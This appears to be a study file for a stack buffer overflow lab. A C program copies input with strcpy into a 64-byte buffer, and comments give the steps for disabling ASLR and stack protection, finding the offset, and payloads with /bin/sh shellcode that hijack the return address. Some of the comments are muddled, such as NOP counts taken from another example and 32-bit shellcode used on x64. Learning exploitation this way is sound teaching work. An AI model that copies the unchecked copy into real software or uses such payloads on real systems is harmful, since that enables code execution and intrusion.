#include <string.h>
#include <stdio.h>

void exploit(){
     printf(" You did the Exploit with SUCCESS");
}

// In 64 bits architecture the char is 1 bytes and is place in $rbp register which the size is 8 bytes 
// so we need 8 addresses of 8  bytes for storage the buffer in the stack
// After the $rbp we have the $rsp and $rip ( the size of $rsp = 8 bytes and it is the same for $rip
// We need to overwrite the $rip in order to call the function exploit 
// We used git project for create pattern and have the exact pattern to overwrite it. 
// And after we used (gdb) to disas all function and have the exact adresses in order to call it ( Pay attention it is write in Little Endian)

void vulnerable_func(char *inputLine)
{

    char buffer[64];					
    strcpy(buffer,inputLine);
    printf("%s\n", buffer);
}

int main(int argc, char *argv[])
{
    vulnerable_func(argv[1]);
    printf("%s\n", "Executed normally");
    return 0;
}

//tiph@TIPH:~/Bureau$ sudo -i
//root@TIPH:~# echo 0 > /proc/sys/kernel/randomize_va_space
//g++ -fno-stack-protector -z execstack test1.cpp -o Exploit
//run $(python -c 'print "A"*80 + "\x89\x51\x55\x55\x55\x55"')
// git clone "https://github.com/ichung/pattern.git" ~/Bufferoverflow/
//./Bufferoverflow/pattern_create.py 92
//run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad"
//(gdb) x $rsp
//0x7fffffffdfa8:	0x41346341
//./Bufferoverflow/pattern_offset.py 0x41346341 -l 92 ====> 72 
//run $(python -c 'print "A"*72 + "\x89\x51\x55\x55\x55\x55"')



// EXPLOIT BOF IN ORDER TO DO EXEC A BASH WITH SHELLCODE

// run $() and disas main 
//    0x00005555555551f8 <+33>:	callq  0x5555555551a5 <_Z15vulnerable_funcPc>
//   0x00005555555551fd <+38>:	lea    0xe26(%rip),%rdi        # 0x55555555602a

// (gdb) break * main + 38
// (gdb) x/100x $rsp

//0x7fffffffda38:	0x00000000	0x00000000	0x41414141	0x41414141
//0x7fffffffda48:	0x41414141	0x41414141	0x41414141	0x41414141

// The addresses bolded above in red (here 0x7fffffffda38)  are the beginning of our buffer on stack so if the buffer was filled
// with NOPS and then our shell code. We should shell.

// The 219 NOPS is the “size of buffer – size of shellcode =  (268-49) “
// 64 - 49 = 15

//  run $(python -c 'print "A"*15 + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\
x42\x42" + "\x38\xda\xff\xff\xff\x7f" ')

//from https://hackademic.co.in/creating-your-first-buffer-overflow-in-x64-machines/
